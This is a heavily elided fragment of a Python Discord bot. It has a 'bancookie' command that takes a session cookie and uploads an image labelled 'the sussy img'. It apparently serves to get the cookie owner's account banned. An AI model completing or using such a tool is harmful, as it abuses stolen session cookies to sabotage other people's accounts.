...
async def bancookie(ctx, cookie=None):
    ...
    files = {'file': ('lol.png', open("theimage.jpg", 'rb'), 'lol.png')} ## add the sussy img 
    data = {
...
@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.playing, name="Checking Your Cookies"))
